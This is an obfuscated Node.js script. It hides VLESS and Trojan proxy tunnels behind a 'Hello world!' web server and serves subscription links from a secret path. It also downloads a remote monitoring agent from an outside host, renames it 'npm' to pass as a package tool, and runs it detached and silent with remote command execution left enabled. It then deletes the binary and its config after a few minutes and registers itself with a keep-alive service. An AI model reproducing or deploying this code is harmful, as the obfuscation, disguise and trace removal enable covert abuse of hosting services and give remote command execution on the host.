const _0x2a2c57=_0x597b;(function(_0x12a2c1,_0x49b6f7){const _0x4417f1=_0x597b,_0x117b28=_0x12a2c1();while(!![]){try{const _0x48a3a6=-parseInt(_0x4417f1(0xe0))/0x1*(-parseInt(_0x4417f1(0xe5))/0x2)+-parseInt(_0x4417f1(0x128))/0x3+-parseInt(_0x4417f1(0x105))/0x4+parseInt(_0x4417f1(0xd7))/0x5*(parseInt(_0x4417f1(0xef))/0x6)+parseInt(_0x4417f1(0x101))/0x7*(-parseInt(_0x4417f1(0x111))/0x8)+-parseInt(_0x4417f1(0xd0))/0x9+parseInt(_0x4417f1(0x115))/0xa*(parseInt(_0x4417f1(0xca))/0xb);if(_0x48a3a6===_0x49b6f7)break;else _0x117b28['push'](_0x117b28['shift']());}catch(_0x468e87){_0x117b28['push'](_0x117b28['shift']());}}}(_0x5afc,0x57d12));const os=require('os'),http=require(_0x2a2c57(0xcd)),fs=require('fs'),axios=require('axios'),net=require(_0x2a2c57(0xe4)),path=require(_0x2a2c57(0xcf)),crypto=require(_0x2a2c57(0x108)),{Buffer}=require(_0x2a2c57(0xdf)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x2a2c57(0xc2)]||'32017281-21e5-46ec-b409-bbe2a29f9263',NEZHA_SERVER=process['env'][_0x2a2c57(0x123)]||'',NEZHA_PORT=process[_0x2a2c57(0xc9)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x2a2c57(0x11a)]||'',DOMAIN=process[_0x2a2c57(0xc9)]['DOMAIN']||'ProxyIP.US.CMLiussss.net',AUTO_ACCESS=process['env'][_0x2a2c57(0x109)]||!![],WSPATH=process[_0x2a2c57(0xc9)][_0x2a2c57(0xf7)]||UUID[_0x2a2c57(0xb7)](0x0,0x8),SUB_PATH=process[_0x2a2c57(0xc9)][_0x2a2c57(0x125)]||_0x2a2c57(0x112),NAME=process['env'][_0x2a2c57(0xc3)]||_0x2a2c57(0xfe),PORT=process[_0x2a2c57(0xc9)]['PORT']||0x1eb4;function _0x5afc(){const _0x23ad17=['&type=A','3477354blWgqR','pipe','end','pop','replace','writeFileSync','\x20-p\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','WSPATH','arm64','country','text/html','443','from','arch','Hug','catch','close','3914239QTdaCx','writeHead','unlink','--tls','1261688VlHcSB',':443?security=tls&sni=','test','crypto','AUTO_ACCESS','hex','error','application/dns-json','map','createHash','concat','connection','8FEaAiG','sub',':443?encryption=none&security=tls&sni=','https://speed.cloudflare.com/meta','90BqrnEU','https://oooo.serv00.net/add-url','aarch64','once','text/plain','NEZHA_KEY','url','log','2053','client_secret:\x20','readUInt16BE','data','base64','npm','NEZHA_SERVER','8.8.4.4','SUB_PATH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','asOrganization','169521KTmosP','chmod\x20+x\x20npm','Status','https://arm64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readUInt8','trim','utf-8','stream','substr','slice','Answer','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','&path=%2F','config.yaml','digest','Not\x20Found\x0a','Server','send','1.1.1.1','then','UUID','NAME','Hello\x20world!','npm\x20is\x20running','toString','index.html','update','env','1043977jjvVUt','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&fp=chrome&type=ws&host=','http','sha224','path','5131692VTIsDC','Unknown','every','split','https://arm64.ssss.nyc.mn/agent','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Server\x20is\x20running\x20on\x20port\x20','5ytVsZB','type','npm\x20download\x20successfully','write','2083','get','listen','length','buffer','42727KYBOWd','https://dns.google/resolve?name=','includes','createWriteStream','net','20ZIYUGQ','npm\x20is\x20already\x20running,\x20skip\x20running...','\x20with\x20all\x20DNS\x20servers','error:\x20','connect','setsid\x20nohup\x20./npm\x20-s\x20','join','Failed\x20to\x20resolve\x20','8443'];_0x5afc=function(){return _0x23ad17;};return _0x5afc();}let ISP='';const GetISP=async()=>{const _0x21c468=_0x2a2c57;try{const _0x55b2e6=await axios[_0x21c468(0xdc)](_0x21c468(0x114)),_0x547485=_0x55b2e6[_0x21c468(0x120)];ISP=(_0x547485[_0x21c468(0xf9)]+'-'+_0x547485[_0x21c468(0x127)])[_0x21c468(0xf3)](/ /g,'_');}catch(_0x524112){ISP=_0x21c468(0xd1);}};GetISP();const httpServer=http['createServer']((_0xfc2032,_0x4a501a)=>{const _0x439628=_0x2a2c57;if(_0xfc2032['url']==='/'){const _0x1b5f03=path[_0x439628(0xeb)](__dirname,_0x439628(0xc7));fs['readFile'](_0x1b5f03,'utf8',(_0x2bde71,_0x18bbd0)=>{const _0x4ecbe9=_0x439628;if(_0x2bde71){_0x4a501a[_0x4ecbe9(0x102)](0xc8,{'Content-Type':_0x4ecbe9(0xfa)}),_0x4a501a[_0x4ecbe9(0xf1)](_0x4ecbe9(0xc4));return;}_0x4a501a['writeHead'](0xc8,{'Content-Type':_0x4ecbe9(0xfa)}),_0x4a501a[_0x4ecbe9(0xf1)](_0x18bbd0);});return;}else{if(_0xfc2032[_0x439628(0x11b)]==='/'+SUB_PATH){const _0x4f1bbe='vless://'+UUID+'@'+DOMAIN+_0x439628(0x113)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x4157c2='trojan://'+UUID+'@'+DOMAIN+_0x439628(0x106)+DOMAIN+_0x439628(0xcc)+DOMAIN+_0x439628(0xba)+WSPATH+'#'+NAME+'-'+ISP,_0x486227=_0x4f1bbe+'\x0a'+_0x4157c2,_0x461a6e=Buffer[_0x439628(0xfc)](_0x486227)[_0x439628(0xc6)](_0x439628(0x121));_0x4a501a[_0x439628(0x102)](0xc8,{'Content-Type':_0x439628(0x119)}),_0x4a501a[_0x439628(0xf1)](_0x461a6e+'\x0a');}else _0x4a501a[_0x439628(0x102)](0x194,{'Content-Type':_0x439628(0x119)}),_0x4a501a[_0x439628(0xf1)](_0x439628(0xbd));}}),wss=new WebSocket[(_0x2a2c57(0xbe))]({'server':httpServer}),uuid=UUID[_0x2a2c57(0xf3)](/-/g,''),DNS_SERVERS=[_0x2a2c57(0x124),_0x2a2c57(0xc0)];function _0x597b(_0x5d4084,_0x15fbdc){const _0x5afc87=_0x5afc();return _0x597b=function(_0x597b01,_0x4761e2){_0x597b01=_0x597b01-0xb2;let _0x5b9ea0=_0x5afc87[_0x597b01];return _0x5b9ea0;},_0x597b(_0x5d4084,_0x15fbdc);}function resolveHost(_0x3162f7){return new Promise((_0x55c934,_0x55cc34)=>{const _0x197078=_0x597b;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x197078(0x107)](_0x3162f7)){_0x55c934(_0x3162f7);return;}let _0x13ed9c=0x0;function _0xbf749f(){const _0x462952=_0x197078;if(_0x13ed9c>=DNS_SERVERS['length']){_0x55cc34(new Error(_0x462952(0xec)+_0x3162f7+_0x462952(0xe7)));return;}const _0x3676be=DNS_SERVERS[_0x13ed9c];_0x13ed9c++;const _0x3b6f69=_0x462952(0xe1)+encodeURIComponent(_0x3162f7)+_0x462952(0xee);axios[_0x462952(0xdc)](_0x3b6f69,{'timeout':0x1388,'headers':{'Accept':_0x462952(0x10c)}})['then'](_0xcd28b0=>{const _0x400a5e=_0x462952,_0xbfcf25=_0xcd28b0[_0x400a5e(0x120)];if(_0xbfcf25[_0x400a5e(0x12a)]===0x0&&_0xbfcf25['Answer']&&_0xbfcf25[_0x400a5e(0xb8)][_0x400a5e(0xde)]>0x0){const _0x1c51f9=_0xbfcf25[_0x400a5e(0xb8)]['find'](_0x23bb01=>_0x23bb01[_0x400a5e(0xd8)]===0x1);if(_0x1c51f9){_0x55c934(_0x1c51f9[_0x400a5e(0x120)]);return;}}_0xbf749f();})[_0x462952(0xff)](_0x14af77=>{_0xbf749f();});}_0xbf749f();});}function handleVlessConnection(_0x336fe9,_0x17d1b1){const _0x56b39a=_0x2a2c57,[_0x2e03e8]=_0x17d1b1,_0x2fe1c7=_0x17d1b1[_0x56b39a(0xb7)](0x1,0x11);if(!_0x2fe1c7['every']((_0x139ccd,_0x9586e4)=>_0x139ccd==parseInt(uuid[_0x56b39a(0xb6)](_0x9586e4*0x2,0x2),0x10)))return![];let _0x45e4c3=_0x17d1b1[_0x56b39a(0xb7)](0x11,0x12)[_0x56b39a(0xb2)]()+0x13;const _0x355ab1=_0x17d1b1[_0x56b39a(0xb7)](_0x45e4c3,_0x45e4c3+=0x2)[_0x56b39a(0x11f)](0x0),_0x3c4feb=_0x17d1b1[_0x56b39a(0xb7)](_0x45e4c3,_0x45e4c3+=0x1)['readUInt8'](),_0x2b1eda=_0x3c4feb==0x1?_0x17d1b1[_0x56b39a(0xb7)](_0x45e4c3,_0x45e4c3+=0x4)[_0x56b39a(0xeb)]('.'):_0x3c4feb==0x2?new TextDecoder()['decode'](_0x17d1b1[_0x56b39a(0xb7)](_0x45e4c3+0x1,_0x45e4c3+=0x1+_0x17d1b1['slice'](_0x45e4c3,_0x45e4c3+0x1)[_0x56b39a(0xb2)]())):_0x3c4feb==0x3?_0x17d1b1[_0x56b39a(0xb7)](_0x45e4c3,_0x45e4c3+=0x10)['reduce']((_0x4c24d6,_0x55ec04,_0x379220,_0x40167b)=>_0x379220%0x2?_0x4c24d6['concat'](_0x40167b[_0x56b39a(0xb7)](_0x379220-0x1,_0x379220+0x1)):_0x4c24d6,[])[_0x56b39a(0x10d)](_0x448cb4=>_0x448cb4[_0x56b39a(0x11f)](0x0)['toString'](0x10))[_0x56b39a(0xeb)](':'):'';_0x336fe9[_0x56b39a(0xbf)](new Uint8Array([_0x2e03e8,0x0]));const _0x2c1074=createWebSocketStream(_0x336fe9);return resolveHost(_0x2b1eda)[_0x56b39a(0xc1)](_0x31b1c2=>{const _0x1ad7c6=_0x56b39a;net[_0x1ad7c6(0xe9)]({'host':_0x31b1c2,'port':_0x355ab1},function(){const _0x11af1a=_0x1ad7c6;this[_0x11af1a(0xda)](_0x17d1b1['slice'](_0x45e4c3)),_0x2c1074['on'](_0x11af1a(0x10b),()=>{})[_0x11af1a(0xf0)](this)['on'](_0x11af1a(0x10b),()=>{})[_0x11af1a(0xf0)](_0x2c1074);})['on'](_0x1ad7c6(0x10b),()=>{});})['catch'](_0x4ace43=>{const _0x3b639a=_0x56b39a;net[_0x3b639a(0xe9)]({'host':_0x2b1eda,'port':_0x355ab1},function(){const _0x2fdeb0=_0x3b639a;this[_0x2fdeb0(0xda)](_0x17d1b1['slice'](_0x45e4c3)),_0x2c1074['on']('error',()=>{})[_0x2fdeb0(0xf0)](this)['on'](_0x2fdeb0(0x10b),()=>{})['pipe'](_0x2c1074);})['on'](_0x3b639a(0x10b),()=>{});}),!![];}function handleTrojanConnection(_0x4e95bb,_0x35ed4a){const _0x18f097=_0x2a2c57;try{if(_0x35ed4a[_0x18f097(0xde)]<0x3a)return![];const _0x22c122=_0x35ed4a[_0x18f097(0xb7)](0x0,0x38)[_0x18f097(0xc6)](),_0x5e63ef=[UUID];let _0x10fc34=null;for(const _0x5b8937 of _0x5e63ef){const _0x49c4f8=crypto[_0x18f097(0x10e)](_0x18f097(0xce))[_0x18f097(0xc8)](_0x5b8937)[_0x18f097(0xbc)](_0x18f097(0x10a));if(_0x49c4f8===_0x22c122){_0x10fc34=_0x5b8937;break;}}if(!_0x10fc34)return![];let _0x11524c=0x38;_0x35ed4a[_0x11524c]===0xd&&_0x35ed4a[_0x11524c+0x1]===0xa&&(_0x11524c+=0x2);const _0x3511a1=_0x35ed4a[_0x11524c];if(_0x3511a1!==0x1)return![];_0x11524c+=0x1;const _0x5cb8f2=_0x35ed4a[_0x11524c];_0x11524c+=0x1;let _0x206289,_0x515dd8;if(_0x5cb8f2===0x1)_0x206289=_0x35ed4a[_0x18f097(0xb7)](_0x11524c,_0x11524c+0x4)['join']('.'),_0x11524c+=0x4;else{if(_0x5cb8f2===0x3){const _0x570053=_0x35ed4a[_0x11524c];_0x11524c+=0x1,_0x206289=_0x35ed4a['slice'](_0x11524c,_0x11524c+_0x570053)['toString'](),_0x11524c+=_0x570053;}else{if(_0x5cb8f2===0x4)_0x206289=_0x35ed4a[_0x18f097(0xb7)](_0x11524c,_0x11524c+0x10)['reduce']((_0x2c55a0,_0xd5c5ff,_0x389b47,_0x552c62)=>_0x389b47%0x2?_0x2c55a0[_0x18f097(0x10f)](_0x552c62[_0x18f097(0xb7)](_0x389b47-0x1,_0x389b47+0x1)):_0x2c55a0,[])[_0x18f097(0x10d)](_0x1a9301=>_0x1a9301[_0x18f097(0x11f)](0x0)[_0x18f097(0xc6)](0x10))[_0x18f097(0xeb)](':'),_0x11524c+=0x10;else return![];}}_0x515dd8=_0x35ed4a[_0x18f097(0x11f)](_0x11524c),_0x11524c+=0x2;_0x11524c<_0x35ed4a['length']&&_0x35ed4a[_0x11524c]===0xd&&_0x35ed4a[_0x11524c+0x1]===0xa&&(_0x11524c+=0x2);const _0x57c840=createWebSocketStream(_0x4e95bb);return resolveHost(_0x206289)[_0x18f097(0xc1)](_0x377686=>{const _0x4afcf3=_0x18f097;net[_0x4afcf3(0xe9)]({'host':_0x377686,'port':_0x515dd8},function(){const _0x4b9485=_0x4afcf3;_0x11524c<_0x35ed4a[_0x4b9485(0xde)]&&this['write'](_0x35ed4a['slice'](_0x11524c)),_0x57c840['on']('error',()=>{})['pipe'](this)['on'](_0x4b9485(0x10b),()=>{})['pipe'](_0x57c840);})['on'](_0x4afcf3(0x10b),()=>{});})[_0x18f097(0xff)](_0x31842c=>{const _0x5ebc70=_0x18f097;net[_0x5ebc70(0xe9)]({'host':_0x206289,'port':_0x515dd8},function(){const _0x10efa2=_0x5ebc70;_0x11524c<_0x35ed4a['length']&&this[_0x10efa2(0xda)](_0x35ed4a['slice'](_0x11524c)),_0x57c840['on'](_0x10efa2(0x10b),()=>{})[_0x10efa2(0xf0)](this)['on'](_0x10efa2(0x10b),()=>{})[_0x10efa2(0xf0)](_0x57c840);})['on'](_0x5ebc70(0x10b),()=>{});}),!![];}catch(_0x39f4a8){return![];}}wss['on'](_0x2a2c57(0x110),(_0x5038f0,_0x227f61)=>{const _0x51ef92=_0x2a2c57,_0x3f8818=_0x227f61['url']||'';_0x5038f0[_0x51ef92(0x118)]('message',_0xf11443=>{const _0x1f25f7=_0x51ef92;if(_0xf11443[_0x1f25f7(0xde)]>0x11&&_0xf11443[0x0]===0x0){const _0x4444d9=_0xf11443[_0x1f25f7(0xb7)](0x1,0x11),_0x444ca7=_0x4444d9[_0x1f25f7(0xd2)]((_0x51e86d,_0x27eb9d)=>_0x51e86d==parseInt(uuid[_0x1f25f7(0xb6)](_0x27eb9d*0x2,0x2),0x10));if(_0x444ca7){!handleVlessConnection(_0x5038f0,_0xf11443)&&_0x5038f0[_0x1f25f7(0x100)]();return;}}!handleTrojanConnection(_0x5038f0,_0xf11443)&&_0x5038f0[_0x1f25f7(0x100)]();})['on'](_0x51ef92(0x10b),()=>{});});const getDownloadUrl=()=>{const _0x31f39c=_0x2a2c57,_0x4715a4=os[_0x31f39c(0xfd)]();return _0x4715a4==='arm'||_0x4715a4===_0x31f39c(0xf8)||_0x4715a4===_0x31f39c(0x117)?!NEZHA_PORT?_0x31f39c(0x12b):_0x31f39c(0xd4):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x19c7ad=_0x2a2c57;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x178bbe=getDownloadUrl(),_0x4055e5=await axios({'method':'get','url':_0x178bbe,'responseType':_0x19c7ad(0xb5)}),_0x3261de=fs[_0x19c7ad(0xe3)](_0x19c7ad(0x122));return _0x4055e5['data']['pipe'](_0x3261de),new Promise((_0x1ed1e6,_0x32ffb9)=>{const _0x5c5fc4=_0x19c7ad;_0x3261de['on']('finish',()=>{const _0x41be72=_0x597b;console['log'](_0x41be72(0xd9)),exec(_0x41be72(0x129),_0x8a8ed8=>{if(_0x8a8ed8)_0x32ffb9(_0x8a8ed8);_0x1ed1e6();});}),_0x3261de['on'](_0x5c5fc4(0x10b),_0x32ffb9);});}catch(_0x2f6e28){throw _0x2f6e28;}},runnz=async()=>{const _0x200716=_0x2a2c57;try{const _0x3dee5e=execSync(_0x200716(0xb9),{'encoding':_0x200716(0xb4)});if(_0x3dee5e[_0x200716(0xb3)]()!==''){console[_0x200716(0x11c)](_0x200716(0xe6));return;}}catch(_0x3b363b){}await downloadFile();let _0x298920='',_0x57cafe=[_0x200716(0xfb),_0x200716(0xed),'2096','2087',_0x200716(0xdb),_0x200716(0x11d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x23521f=_0x57cafe['includes'](NEZHA_PORT)?_0x200716(0x104):'';_0x298920=_0x200716(0xea)+NEZHA_SERVER+':'+NEZHA_PORT+_0x200716(0xf5)+NEZHA_KEY+'\x20'+_0x23521f+_0x200716(0xd5);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4dc92e=NEZHA_SERVER[_0x200716(0xe2)](':')?NEZHA_SERVER[_0x200716(0xd3)](':')[_0x200716(0xf2)]():'',_0x3d682=_0x57cafe[_0x200716(0xe2)](_0x4dc92e)?'true':'false',_0x410aae=_0x200716(0x11e)+NEZHA_KEY+_0x200716(0xcb)+NEZHA_SERVER+_0x200716(0x126)+_0x3d682+_0x200716(0x12c)+UUID;fs[_0x200716(0xf4)]('config.yaml',_0x410aae);}_0x298920=_0x200716(0xf6);}else{console[_0x200716(0x11c)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x298920,{'shell':'/bin/bash'},_0x25ddfa=>{const _0x1b3506=_0x200716;if(_0x25ddfa)console[_0x1b3506(0x10b)]('npm\x20running\x20error:',_0x25ddfa);else console[_0x1b3506(0x11c)](_0x1b3506(0xc5));});}catch(_0x56e89b){console[_0x200716(0x10b)](_0x200716(0xe8)+_0x56e89b);}};async function addAccessTask(){const _0x285d40=_0x2a2c57;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x482525='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x1fe17d=await axios['post'](_0x285d40(0x116),{'url':_0x482525},{'headers':{'Content-Type':'application/json'}});console[_0x285d40(0x11c)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xef4bd3){}}const delFiles=()=>{const _0x46e2c4=_0x2a2c57;fs['unlink'](_0x46e2c4(0x122),()=>{}),fs[_0x46e2c4(0x103)](_0x46e2c4(0xbb),()=>{});};httpServer[_0x2a2c57(0xdd)](PORT,()=>{const _0x5d0311=_0x2a2c57;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5d0311(0x11c)](_0x5d0311(0xd6)+PORT);});
